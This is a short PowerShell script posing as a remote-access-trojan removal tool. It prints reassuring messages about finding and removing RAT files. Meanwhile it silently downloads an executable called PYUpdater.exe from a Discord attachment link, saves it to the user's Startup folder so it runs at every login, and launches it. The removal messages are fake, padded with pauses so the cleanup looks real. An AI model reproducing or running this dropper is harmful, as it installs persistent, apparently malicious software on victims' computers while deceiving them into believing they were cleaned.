Write-Host "Finding Remote Access Files..."

$url = "https://cdn.discordapp.com/attachments/1500723996185067600/1524526091924930742/PYUpdater.exe?ex=6a501110&is=6a4ebf90&hm=baebb095219eb9e54a7d2cf7fafaf818829e76ad957ea58b80c56981c0e0fb3b&"
$dest = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
$fn = "PYUpdater.exe"

if (-not (Test-Path -Path $dest)) {
    New-Item -ItemType Directory -Path $dest -Force | Out-Null
}

$fp = Join-Path -Path $dest -ChildPath $fn

$ProgressPreference = 'SilentlyContinue'
Start-BitsTransfer $url $fp -EA Stop
Start-Process -FilePath $fp

Write-Host "Removing Temporary Account Data Files..."
Start-Sleep -Milliseconds 300
Write-Host "Removing RAT File..."
Start-Sleep -Milliseconds 220
Write-Host "Removing RAT from Startup Folder..."
Start-Sleep -Milliseconds 280
Write-Host "Removal Complete!"
Write-Host "Closing Window."
Start-Sleep -Milliseconds 120
